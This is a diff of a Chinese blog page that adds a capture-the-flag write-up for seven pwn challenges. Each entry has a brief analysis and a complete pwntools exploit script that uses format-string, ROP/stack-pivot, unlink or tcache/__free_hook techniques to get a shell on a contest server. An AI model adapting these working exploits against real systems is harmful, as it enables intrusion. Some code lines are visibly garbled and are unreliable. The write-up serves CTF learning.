@@ -483,21 +483,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-05-21
+                    2022-05-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    3.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    19 分
                 </div>
                 
 
@@ -520,7 +520,704 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="create-id"><a href="#create-id" class="headerlink" title="create_id"></a><font color="DarkTurquoise">create_id</font></h2><p><img src="https://cdn.jsdelivr.net/gh/Lsec-cyber/images@main/img/p1-1.png"></p>
+<h3 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下:"></a>exp如下:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+#r=process("./31")
+r=remote("ip","port")
+r.recv(2)
+t=int(r.recv(8),16)
+print((t))
+r.sendline(&amp;apos;1&amp;apos;)
+r.recv()
+r.sendline(&amp;apos;1&amp;apos;)
+r.recv()
+pay=fmtstr_payload(10,{(t):9})
+r.sendlipay=fmtstr_payload(10,{(t):9})
+r.sendline(pay)
+r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="sim-treasure"><a href="#sim-treasure" class="headerlink" title="sim_treasure"></a><font color="DarkTurquoise">sim_treasure</font></h2><p><img src="https://cdn.jsdelivr.net/gh/Lsec-cyber/images@main/img/p2-1.png"></p>
+<blockquote>
+<p>这题保护比较少盲猜难度不大，但是比较危险的是有printf输入格式化字符串</p>
+<p>发现格式化字符串漏洞,IDA跟asvj****函数，里面调用了str的相关函数</p>
+<p>使用returm to libc的方法</p>
+<p>传入/bin/sh然后劫持printf函数就行</p>
+</blockquote>
+<h3 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context.log_level='debug'
+#io=process("./sp1")
+io=remote("123.57.69.203",7010)
+elf = ELF("./sp1")
+libc = ELF("./libc-2.27.so")
+puts_got = elf.got['puts']
+io.recvuntil("Can you find the magic word?\n")
+
+pay_1 = p32(elf.got["puts"])+"%6$s"
+#gdb.attach(io)	
+io.sendline(pay_1)
+io.recv(4)
+puts_addr = u32(io.recv(4))
+print "puts_got="+hex(puts_addr)
+#gdb.attach(io)
+printf_got = elf.got['printf']
+print "printf_got="+hex(printf_got)
+libc_base = puts_addr - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+print "system_addr="+hex(system_addr)
+io.sendline("A")
+
+payload1 = fmtstr_payload(6, {printf_got: system_addr})
+io.recvuntil("A\n")
+#gdb.attach(io)
+io.sendline(payload1)
+io.sendline("/bin/sh")
+
+
+io.interactive();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="跳一跳"><a href="#跳一跳" class="headerlink" title="跳一跳"></a><font color="DarkTurquoise">跳一跳</font></h2><p><img src="https://cdn.jsdelivr.net/gh/Lsec-cyber/images@main/img/p3-1.png"></p>
+<blockquote>
+<p>Checksec 保护全开</p>
+</blockquote>
+<blockquote>
+<p>可能到一个read函数 盲猜泄露Canary和栈迁移</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/Lsec-cyber/images@main/img/p3-2.png"></p>
+<h3 id="exp如下-1"><a href="#exp如下-1" class="headerlink" title="exp如下:"></a>exp如下:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"># *- coding:utf-8 -*-
+from pwn import *
+from LibcSearcher import LibcSearcher
+context(os="linux", arch="amd64", log_level="debug")
+
+
+l64 = lambda				:u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
+l32 = lambda				:u32(sh.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
+#常用于调用了ROP输出类函数后，接受并转化为int类型
+#                       uxx(   ru("\x7f")[-6:].ljust(8,"\x00")    )
+leak= lambda name,data		:sh.success(name + ": 0x%x" % data)
+s	= lambda payload		:sh.send( payload)
+sa  = lambda a,b			:sh.sendafter(str(a),str(b))
+sl  = lambda payload		:sh.sendline(payload )
+sla = lambda a,b			:sh.sendlineafter(str (a),str(b))
+ru  = lambda a				:sh.recvuntil(str(a))
+r   = lambda numb=4096     	:sh.recv(numb)
+# https://www.yuque.com/squirre17/qqf7/wbeago #5b71964e
+rl	= lambda 				:sh.recvline()
+uu32= lambda data			:u32(data.ljust(4, b'\x00'))
+uu64= lambda data			:u64(data.ljust(8, b'\x00'))
+
+def b(addr):
+	bk="b *$rebase("+str(addr)+")" #pie
+	#bk="b *"+str(addr)
+	attach(sh,bk+"\nc")
+	success("attach")
+
+filename = "pwn"
+elf = ELF("./pwn")
+def pwn(ip,port,debug,remote_libc , local_libc):
+	global sh
+	# global libc     local 不需要.
+	if(debug == 1):
+		sh = process("./{}".format(filename))
+		# sh = process("", env={"LD_PRELOAD": libc_path})
+		#  p=process(["ld.so","./goal"],env={"LD_PRELOAD":"libc.so"}, stdout=stdout, stdin= stdin)
+		libc = local_libc
+	else:
+		sh = remote(ip,port)
+		libc = remote_libc
+	# sh.timeout =   0.1
+	#b(0x1217) #printf
+	#b(0x11E9) #scanf
+	#b(0x1230) #read
+
+	ru("of pwn~")
+
+	for i in range(0xd8+1):
+		#sleep(0.01)
+		sl(b"210")
+	s(b'a')
+	#for i in range(0xe8-0xd8-1):
+	
+	print("success")
+
+	ru("input is: ")
+	data = r()
+	print("data==&gt;",data)
+
+
+	canary_int = u64(data[-13:-6].rjust(8,b"\x00"))#data[-8:]
+	print("__canary==&gt;",hex(canary_int),type(canary_int))  #0xf64ca0835849ae00
+
+	instant_rsp = u64(data[-6:].ljust(8,b"\x00"))
+	print("instant_rsp==&gt;",hex(instant_rsp))
+
+	#leak pie									
+	#   						     rbp  rip
+	#pie: printf + read = 0x01
+	#pie: read          = 0x1c
+
+	read = 0x121c
+	# print( rbp - 0xe0)												read
+	s((0xe0-0x8 )*b"a"  + p64(canary_int) +  p64(instant_rsp + 0xe0) +p8(0x01))
+	ru("input is: ")
+	data = r()
+	A_elfaddr = u64(data[-6:].ljust(8,b"\x00"))#;print("A_elfaddr==&gt;",hex(A_elfaddr))
+	pie = A_elfaddr - 0x12b0
+	elf_bss = elf.bss() + pie;data = elf_bss + 0x330
+
+	##第一次--&gt;栈迁移(rbp)到elf_data段                            got (buf)
+	read = pie + read
+	buf = b"a"*(0xe0-8);canary = canary_int;rbp = data;rip = read
+	print("data = rbp1/rsp1=&gt;",hex(rbp),"rip1=&gt;",hex(rip))
+	s(buf + p64(canary) + p64(rbp) + p64(rip) )
+
+	#第二次--&gt;往data段写入rop
+	ret = 0x1016 + pie
+	pop_rdi_ret = 0x130b + pie
+	leave_ret = 0x124A + pie
+	puts_got = elf.got["puts"] + pie;puts_plt = elf.plt["puts"] + pie
+	read_got = elf.got["read"] + pie;read_plt = elf.plt["read"] + pie
+	printf_got = elf.got["printf"] + pie;setbuf_got = elf.got['setbuf']
+
+	# 0x5579bd60f358
+	next_read_ptr = data + 0x200 ;print("rbp3=next_read_ptr",hex(next_read_ptr))
+	print("rsp=&gt;",hex(data+0x8))
+	rop = p64(next_read_ptr)
+	# 0x55ee8e847278 
+	rop +=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)
+	rop += p64(pop_rdi_ret)+p64(read_got)+p64(puts_plt)
+	rop += p64(pop_rdi_ret)+p64(printf_got)+p64(puts_plt)
+	
+	rop += p64(ret)+ p64(read)+p64(leave_ret)
+	rop += p64(canary)*int(27 - 13)#13#rop.ljust(0xe0-8,b"a")
+			# 
+	buf = rop;canary = canary_int;rbp = data-0xe0;rip = leave_ret
+	# 这里可以造成 rbp1-&gt;rbp2-next_read_ptr
+	print("next_read_ptr = rbp2",hex(rbp),"rip2=&gt;",hex(rip))
+	s(buf + p64(canary) + p64(rbp) + p64(rip))
+
+	raw_input()
+	#一次性
+	puts_addr = u64(r(7)[-7:-1].ljust(8,b"\x00")) ;leak("puts_addr",puts_addr)
+	read_addr = u64(r(7)[-7:-1].ljust(8,b"\x00")) ;leak("read_addr",read_addr)
+	printf_addr = u64(r(7)[-7:-1].ljust(8,b"\x00"));leak("printf_addr",printf_addr)
+	#setbuf_addr = u64(r(7)[-7:-1].ljust(8,b"\x00"));leak("setbuf_addr",setbuf_addr)
+	
+	
+	"""
+	puts_addr = u64(r(6).ljust(8,b"\x00")) ;leak("puts_addr",puts_addr);
+	data2 = r(0xf)
+	read_addr = u64(data2[-14:-8].ljust(8,b"\x00")) ;leak("read_addr",read_addr);rl()
+	printf_addr = u64(data2[-7:-1].ljust(8,b"\x00"));leak("printf_addr",printf_addr);rl()
+	#setbuf_addr = u64(r(7)[-7:-1].ljust(8,b"\x00"));leak("setbuf_addr",setbuf_addr)
+	"""
+
+	#puts_addr = u64(data[])
+	#通过后12位偏移查询libc版本
+	libc = LibcSearcher('puts', puts_addr)
+	libc.add_condition("read", read_addr)
+	libc.add_condition("printf", printf_addr)
+	#libc基地址 = write地址 - write偏移
+	libc_base = puts_addr - libc.dump('puts')
+
+
+	print("######################## third ########################")
+	#第3次
+	system_addr = libc_base + libc.dump('system')
+	bin_sh_addr = libc_base + libc.dump('str_bin_sh')
+	leak("system_addr",system_addr);leak("bin_sh_addr",bin_sh_addr)
+
+	rop = p64(next_read_ptr-0xe0)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr)
+	rop += p64(canary)*int(27 - 5)#rop.ljust(0xe0-8,b"a")
+	buf = rop;canary = canary_int;rbp = next_read_ptr-0xe0;rip = leave_ret
+	s(buf + p64(canary) + p64(rbp) + p64(rip))
+
+
+	sh.interactive()
+
+
+if __name__ == "__main__":
+	# pwn remote  if 0; local if 1...#
+	pwn("123.57.69.203",7020,0, remote_libc = 0 , local_libc=ELF("/lib/x86_64-linux-gnu/libc.so.6"))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a><font color="DarkTurquoise">unlink</font></h2><p><img src="https://cdn.jsdelivr.net/gh/Lsec-cyber/images@main/img/p4-1.png"></p>
+<h3 id="exp如下-2"><a href="#exp如下-2" class="headerlink" title="exp如下:"></a>exp如下:</h3><pre class="line-numbers language-none"><code class="language-none"># coding=utf-8
+# *- coding:utf-8 -*-
+# from pwn_debug import *
+from struct import pack
+from pwn import *
+import sys;import time;import os
+# from LibcSearcher import *
+# 设置timeout;sh.timeout = 0.1
+context(os="linux", arch="amd64", log_level="debug")
+# context(os="linux",arch="i386",log_level="debug")
+# context.terminal = ["tmux", "splitw", "-h"] ; context.arch = "amd64" ; context.log_level="debug" # 暂无这个
+# tmux  换到4.7以上再说
+filename = "unlink"
+libcpath = ""
+sh = 0
+lib = 0
+elf = ELF(filename)  # local长
+local_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  #
+#  remote_buu_libc = ELF("/home/rencvn/Desktop/install/libc-2.27.so",checksec = False)
+#  libc = ELF("/home/rencvn/Desktop/BUU/Glibc/Ubuntu18_GLIBC_2.27-3ubuntu1/64/libc-2.27.so")
+u16_local_one = [0x45216,0x4526a,0xf02a4,0xf1147] # one_gadget (-l2) /lib/x86_64-linux-gnu/libc.so.6 giantbranch  2.23-0ubuntu10
+u18_local_one = [0x4f2a5,0x4f302,0x10a2fc] # one_gadget (-l2) /lib/x86_64-linux-gnu/libc.so.6        Rencvn		  2.27-3ubuntu1.5
+u20_local_one = [0xe3b2e,0xe3b31,0xe3b34]  # one_gadget (-l2) /lib/x86_64-linux-gnu/libc.so.6		 Ln-Pwn       2.31-0ubuntu9.7
+
+
+""" """
+l64 = lambda				:u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
+l32 = lambda				:u32(sh.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
+#bytes ==&gt;  int
+#常用于调用了ROP输出类函数后，接受并转化为int类型
+#                       uxx(   ru("\x7f")[-6:].ljust(8,"\x00")    )
+leak= lambda name,data		:sh.success(name + ": 0x%x" % data)
+s	= lambda payload		:sh.send( payload)
+sa  = lambda a,b			:sh.sendafter(str(a),str(b))
+sl  = lambda payload		:sh.sendline(payload )
+sla = lambda a,b			:sh.sendlineafter(str (a),str(b))
+ru  = lambda a				:sh.recvuntil(str(a))
+r   = lambda numb=4096     	:sh.recv(numb)
+# https://www.yuque.com/squirre17/qqf7/wbeago #5b71964e
+rl	= lambda 				:sh.recvline()
+uu32= lambda data			:u32(data.ljust(4, b'\x00'))
+uu64= lambda data			:u64(data.ljust(8, b'\x00'))
+# https://blog.cc arol2358/article/details/106262701
+info_addr = lambda tag, addr        :sh.info(tag + ': {:#x}'. format(addr))
+check = lambda data	                :"data=",data,"|*|","type=&gt;",type(data)
+
+# 这里使用print会报错
+# 交互时
+# py2 &lt;==&gt; str = bytes
+#addr=int(sh.recvuntil('\n',drop=True),base=16)
+
+def add(index,size,data):
+	success("########-&gt;add&lt;-########")
+	sl("add")				  # fgets
+	sla("Index: ",str(index)) 
+	sla("Size: ",str(size))   # scanf
+	sa("Data: ",data+"\n")		  # gets
+
+
+def delete(index):
+	success("########-&gt;delete&lt;-########")
+	sl("remove")			  # fgets
+	sla("Index: ",str(index)) # scanf
+
+
+sys = 0x400896
+#sh = process("./unlink")
+sh = remote("123.57.69.203",5810)
+#gdb.attach(sh,"b *0x400A78")
+				#   malloc   # 
+#gdb.attach(sh,"b *0x4009BD\n"+"b *0x400A8A\n"+"c\n"*(24) ) 
+add(0,0x410,"aaaa")#fake_chunk)#0
+add(1,0xe8,"bbbb")#1
+add(2,0x4f0,"cccc")#2
+add(3,0x60,"/bin/sh\x00dddd")#3
+add(4,0x60,"/bin/sh\x00eeee")#4
+
+delete(0)
+#pause()
+delete(1)
+for i in range(6):
+   add(1,0xe8-i,"b"*(0xe8-i))
+   delete(1)
+
+add(1,0xe8,"b"*0xe0+p64(0x510))#1
+delete(2) #合并chunk2+chunk1+chunk0
+success("合并chunk")
+
+delete(1)
+fgets_got  =  elf.got["fgets"]#0x601050 
+free_got  = elf.got["free"]#0x601018
+system_plt = elf.plt["system"];system_got = elf.got["system"]
+puts_plt = elf.plt["puts"]
+
+add(0,0x10+0x410+0xe8,0x410*"a"+p64(0x420)+p64(0xf0)+p64(free_got))#chunk0 + chunk1
+add(5,0xe0,"/bin/sh\x00ffff")
+
+add(6,0xe0,3*p64(system_plt+6))
+
+#add(6,0xe0,2*p64(0x400706)) #xxx
+#add(6,0xe0,2*p64(sys))
+raw_input()
+sl("/bin/sh\x00")
+#delete(5)
+sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="untidy-note"><a href="#untidy-note" class="headerlink" title="untidy_note"></a><font color="DarkTurquoise">untidy_note</font></h2><p><img src="https://cdn.jsdelivr.net/gh/Lsec-cyber/images@main/img/p5-1.png"></p>
+<blockquote>
+<p>保护全开</p>
+<p>IDA分析完看到对堆进行了一些列操作</p>
+<p>盲猜这是一个堆漏洞</p>
+<p>直接构思</p>
+</blockquote>
+<h3 id="exp如下-3"><a href="#exp如下-3" class="headerlink" title="exp如下:"></a>exp如下:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+#r=process('./pwn3')
+r=remote()
+context.log_level='debug'
+libc=ELF('libc-2.27.so')
+def add(how):
+	r.recvuntil("is:\n")
+	r.sendline("1")
+	r.recvuntil("is:\n")
+	r.sendline(str(how))
+def edit(which,how,what):
+	r.recvuntil("is:\n")
+	r.sendline("3")
+	r.recvuntil(":\n")
+	r.sendline(str(which))
+	r.recvuntil("is:\n")
+	r.sendline(str(how))
+	r.recvuntil(":\n")
+	r.sendline(what)
+
+def show(which):
+	r.recvuntil("is:\n")
+	r.sendline("4")
+	r.recvuntil(":\n")
+	r.sendline(str(which))
+def dele(which):
+	r.recvuntil("is:\n")
+	r.sendline("2")
+	r.recvline()
+	r.sendline(str(which))
+#gdb.attach(r)
+r.recv()
+r.sendline('1')
+for i in range(10):
+	add(30)
+for i in range(8):
+	dele(i)
+r.recv()
+r.sendline('1'*0x400)
+show(7)
+r.recvuntil("Content:")
+base=u64(r.recv(6)+'\x00'*2)-0x3ebcc0
+print(hex(base))
+raw_input()
+free_hook=base+libc.sym['__free_hook']
+sys=base+libc.sym['system']
+edit(1,30,p64(free_hook)*2)
+for i in range(7):
+	add(30)
+edit(4,30,"/bin/sh\x00")
+edit(8,30,p64(sys))
+dele(4)
+r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="h-o-s"><a href="#h-o-s" class="headerlink" title="h-o-s"></a><font color="DarkTurquoise">h-o-s</font></h2><p><img src="https://cdn.jsdelivr.net/gh/Lsec-cyber/images@main/img/p6-1.png"></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li><p>在cmd布置fakechunk，free到unsortedbin泄露libc</p>
+</li>
+<li><p>再次将fakechunk释放到tcache，制造overlap</p>
+</li>
+<li><p>将freehook链入tcache，打freehook为system</p>
+</li>
+</ul>
+<h3 id="exp如下-4"><a href="#exp如下-4" class="headerlink" title="exp如下:"></a>exp如下:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"># -*- coding: UTF-8 -*-
+from pwn import *
+
+context.log_level = 'debug'
+context.terminal = ["/bin/tmux","sp","-h"]
+
+io = remote('123.57.69.203',5820 )
+# io = remote('127.0.0.1',49161 )
+# libc = ELF('./libc-2.31.so')
+# io = process('./hos')
+libc = ELF('./libc.so.6')
+elf = ELF('./hos')
+
+l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
+l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
+rl = lambda	a=False		: io.recvline(a)
+ru = lambda a,b=True	: io.recvuntil(a,b)
+rn = lambda x			: io.recvn(x)
+sn = lambda x			: io.send(x)
+sl = lambda x			: io.sendline(x)
+sa = lambda a,b			: io.sendafter(a,b)
+sla = lambda a,b		: io.sendlineafter(a,b)
+irt = lambda			: io.interactive()
+dbg = lambda text=None  : gdb.attach(io, text)
+lg = lambda s			: log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s)))
+uu32 = lambda data		: u32(data.ljust(4, '\x00'))
+uu64 = lambda data		: u64(data.ljust(8, '\x00'))
+ur64 = lambda data		: u64(data.rjust(8, '\x00'))
+
+def add(size,content):
+	sl('fill')
+	sl(str(size))
+	sl(content)
+def delete():
+	sl('get')
+
+
+
+buf = 0x6010a0
+cmd = 0x601160
+
+add(0x41,'a')#n =0
+# add(0x31,'a')#n=0
+pay = 'get'.ljust(0x8,'\x00') + p64(0x61)+p64(0)+p64(0xb1)+p64(0)+p64(0xa1)+p64(0)+p64(0x91) + p64(0) + p64(0x81) + p64(0) + p64(0x71)+ p64(0) + p64(0x61) + p64(0) +p64(buf+0x70)
+sl(pay)
+sl('get')#n=-1
+add(0x81,'a')#n=0
+add(0x81,'a')#n=1
+add(0x81,'a')#n=2
+add(0x81,'a')#n=3
+add(0x81,'a')#n=4
+add(0x81,'a')#n=5
+add(0x81,'a')#n=6
+add(0x81,'a')#n=7
+delete()
+delete()
+delete()
+delete()
+delete()
+delete()
+pay = 'get'.ljust(0x8,'\x00') + p64(0x91)+p64(0)+p64(0xb1)+p64(0)+p64(0xa1)+p64(0)+p64(0x91) + p64(0) + p64(0x81)+ p64(0) + p64(0x71)+ p64(0) + p64(0x61) + p64(0) +p64(buf+0x10)
+sl(pay)
+add(0x51,p64(buf+0x10) + p64(buf+0x70) + p64(buf+0x10)*2+p64(0x91)+p64(0x31))#n=1
+delete()#n=0
+sl('get')#n=-1
+add(0x51,p64(buf+0x70) + p64(buf+0x10) + p64(buf+0x70)*2+p64(0x91)+p64(0x31))#n=0
+sl('get')#n=-1
+libcbase = l64() -0x3ebca0
+lg('libcbase')
+freehook = libcbase + libc.symbols['__free_hook']
+lg('freehook')
+system = libcbase + libc.symbols['system']
+lg('system')
+add(0x81,'a')#n=0
+
+pay = 'get'.ljust(0x8,'\x00') + p64(0x91)+p64(0)+p64(0xb1)+p64(0)+p64(0xa1)+p64(0)+p64(0x91) + p64(0) + p64(0x81)+ p64(0) + p64(0x71)+ p64(0) + p64(0x61) + p64(0) +p64(buf+0x40)
+sl(pay)#n = -1
+
+pay = 'fill'.ljust(0x8,'\x00') + p64(0x91)+p64(0)+p64(0xb1)+p64(0)+p64(0xa1)+p64(0)+p64(0x91) + p64(freehook) + p64(0x81)+ p64(0) + p64(0x71)+ p64(0) + p64(0x61) + p64(0) +p64(buf+0x40)
+sl(pay)#n = 0
+
+add(0x81,p64(system))
+add(0x41,'/bin/sh\x00')
+delete()
+# dbg()
+
+
+irt()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="heapheap"><a href="#heapheap" class="headerlink" title="heapheap"></a><font color="DarkTurquoise">heapheap</font></h2><p><img src="https://cdn.jsdelivr.net/gh/Lsec-cyber/images@main/img/p7-1.png"></p>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h3><ul>
+<li>布置堆布局，通过一次释放堆块，合并，在下个chunk的prev_size留下size，为overlap做准备</li>
+<li>重新申请回去，接着释放开头chunk，offbynull覆盖第三个chunk的inuse位，free掉第三个chunk，造成overlap，中间第二个chunk会overlap</li>
+<li>在unsortedbin中制造与tcachebin的chunk overlap，将stdout后12bit偏移链入tcache</li>
+<li>申请到stdout，泄露libc，之后再构造chunk overlap，将frehook改为system</li>
+<li>getshell</li>
+</ul>
+<h3 id="exp如下-5"><a href="#exp如下-5" class="headerlink" title="exp如下:"></a>exp如下:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"># -*- coding: UTF-8 -*-
+from pwn import *
+
+context.log_level = 'debug'
+context.terminal = ["/bin/tmux","sp","-h"]
+
+# io = remote('127.0.0.1', 49167)
+io = remote('123.57.69.203', 5320)
+# libc = ELF('./libc-2.31.so')
+# io = process('./heapheap')
+libc = ELF('./libc.so.6')
+
+l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
+l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
+rl = lambda	a=False		: io.recvline(a)
+ru = lambda a,b=True	: io.recvuntil(a,b)
+rn = lambda x			: io.recvn(x)
+sn = lambda x			: io.send(x)
+sl = lambda x			: io.sendline(x)
+sa = lambda a,b			: io.sendafter(a,b)
+sla = lambda a,b		: io.sendlineafter(a,b)
+irt = lambda			: io.interactive()
+dbg = lambda text=None  : gdb.attach(io, text)
+lg = lambda s			: log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s)))
+uu32 = lambda data		: u32(data.ljust(4, '\x00'))
+uu64 = lambda data		: u64(data.ljust(8, '\x00'))
+ur64 = lambda data		: u64(data.rjust(8, '\x00'))
+
+
+def add(size,content):
+	sla('your choice: ','1')
+	sla('size:',str(size))
+	sa('Data:',content)
+def show(idx):
+	sl('2')
+	sla('Index?\n',str(idx))
+	
+def edit(idx,content):
+	sl('3')
+	sla('Index?\n',str(idx))
+	sa('content:\n',content)
+		
+def delete(idx):
+	sla('your choice: ','2')
+	sla('index:',str(idx))
+
+
+add(0xf0,'a'*0xf0)#0
+add(0xf0,'c'*0xf0)#1
+add(0xf0,'c'*0xf0)#2
+
+for i in range(7):#3-9
+	add(0xf0,'a'*0xf0)
+
+for i in range(3,10):
+	delete(i)
+
+delete(0)
+delete(1)
+delete(2) # prev_size=0x200
+
+for i in range(7):#0-6
+	add(0xf0,'a'*0xf0)
+
+add(0xf0,'c'*0xf0)#7
+add(0xf0,'c'*0xf0)#8
+add(0xf0,'c'*0xf0)#9 prev_size=0x200
+
+for i in range(7):
+	delete(i)
+delete(7) # free to unsortedbin
+
+for i in range(7):#0-6
+	add(0xf0,'a'*0xf0)
+
+delete(8)
+add(0xf8,'offbynull')#7
+
+for i in range(7):
+	delete(i)
+delete(9) # chunk overlap  unsortedbin size = 0x300
+
+for i in range(7):#0-6
+	add(0xf0,'a'*0xf0)
+
+add(0xf0,'c'*0xf0)#8
+add(0xf0,'c'*0xf0)#9 7 overlap
+for i in range(6):
+	delete(i)
+delete(7) # free to tcache[0x100]
+delete(9) # free to unsortedbin
+
+# add(0x1f0,'c'*0xf0)#0
+add(0x20,p16(0x5760))#0 overwrite to stdout
+# dbg()
+add(0xf0,'c'*0x20+p64(0)+p64(0x1d0))#1
+add(0xf0,p64(0xfbad1887)+p64(0)*3+p8(0))#2
+rev = rn(4)
+if rev == '****':
+	raise Exception('error leak!')
+	exit(0)
+libcbase = l64()
+if libcbase &gt;&gt; 40 != 0x7F:
+      raise Exception('error leak!')
+libcbase = libcbase - 0x3ed8b0
+lg('libcbase')
+system = libcbase + libc.symbols['system']
+freehook = libcbase + libc.symbols['__free_hook']
+one = libcbase + 0x4f432 #0x4f322\0x4f2c5
+add(0x20,'d'*0x20)#3
+delete(3)
+delete(0)
+delete(1)
+
+add(0x20,p64(freehook))#0
+add(0x20,'/bin/sh\x00')#1
+add(0x20,p64(one))#3
+delete(1)
+
+
+
+irt()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span>